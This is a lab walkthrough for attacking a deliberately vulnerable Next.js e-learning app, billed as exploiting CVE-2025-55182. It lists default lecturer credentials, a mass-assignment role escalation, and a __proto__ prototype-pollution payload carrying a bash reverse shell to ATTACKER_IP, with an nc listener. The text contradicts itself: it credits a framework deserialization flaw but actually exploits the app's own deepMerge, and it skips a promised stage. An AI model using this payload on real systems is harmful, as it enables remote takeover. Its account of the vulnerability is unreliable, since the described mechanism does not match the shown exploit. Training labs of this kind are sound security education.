# Lab Walkthrough: React2Shell (CVE-2025-55182)

## 1. Objective
The goal of this lab is to exploit **CVE-2025-55182 (React2Shell)**, a critical insecure deserialization vulnerability in Next.js 15.0.3 and React 19.0.0-rc. The attack involves bypassing authentication middlewares by combining session hijacking (or mass assignment) with a malformed React Flight protocol payload to achieve Remote Code Execution (RCE).

**Attack Chain:** Get Lecturer Session → Extract Action ID → React2Shell (RCE) → Reverse Shell

## 2. Reconnaissance
- **Target URL:** `http://TARGET_IP:3000`
- **Goal:** Identify the technology stack and potential entry points.
- **Findings:**
  - Headers and JS Bundles indicate **Next.js 15.0.3 / React 19.0.0-rc**.
  - A quick search in CVE databases reveals **CVE-2025-55182**, an insecure deserialization vulnerability in `decodeReply`.
  - The application uses Server Actions, which are the primary attack surface for React2Shell.

## 3. Stage 1: Authentication & Authorization

To exploit Server Actions protected by Next.js middleware, the attacker needs a valid session cookie for an authorized role (in this case, `LECTURER`).

### Option A: Use Default Credentials
1. Navigate to `/login`.
2. Login as `lecturer@elearning.com` with password `password123`.

### Option B: Escalate from Student (Mass Assignment)
1. Register a new `STUDENT` account.
2. Intercept the "Save Changes" request in Profile Settings.
3. Inject `"role": "LECTURER"` into the JSON body. The backend `deepMerge` function merges this into the user record.
4. Re-login to get a new session token with `LECTURER` privileges.

## 4. Stage 2: Exploiting Prototype Pollution to RCE

The attacker intercepts the Server Action request for creating an assignment and injects a Prototype Pollution payload to pollute `logCommand` globally, achieving RCE when `child_process.exec` is called.

### 4.1 Prepare the C2 Listener
On the attacker machine, open a terminal:
```bash
nc -lvnp 4444
```

### 4.2 Craft the Payload
1. As a Lecturer, navigate to `/lecturer/assignments`.
2. Turn on Burp Suite Intercept.
3. Fill out the "Create Assignment" form and click Submit.
4. In Burp Suite, inspect the intercepted `POST` request to `/lecturer/assignments`.
5. The request body is a JSON array (Next.js Server Action payload). Locate the assignment data object (e.g. `{"title":"Test Exploit", ...}`).
6. Inject the `__proto__` payload into this JSON object:

```json
{
  "title": "Test Exploit",
  "module": "General",
  "type": "Homework",
  "dueDate": "2026-10-10",
  "__proto__": {
    "logCommand": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
  }
}
```

### 4.3 Execution
1. Forward the modified request in Burp Suite.
2. The `deepMerge` function merges the payload, polluting `Object.prototype.logCommand`.
3. The server executes `child_process.exec(logCommand)`.
4. The reverse shell connects back to your `nc` listener!

> **Note:** The server will likely throw an error after the command executes (e.g., a Prisma Validation Error when it tries to save the polluted metadata to the database), but the RCE will have already succeeded.

## 6. Conclusion
This lab demonstrates that:
1. Framework-level vulnerabilities like **React2Shell (CVE-2025-55182)** can completely bypass application logic and security measures.
2. Server Actions in Next.js 15.0.3 expose a massive attack surface if not properly patched.
3. Middleware authentication is crucial, but once an attacker gains any valid session (even via other flaws like Mass Assignment), they can exploit framework zero-days effectively.
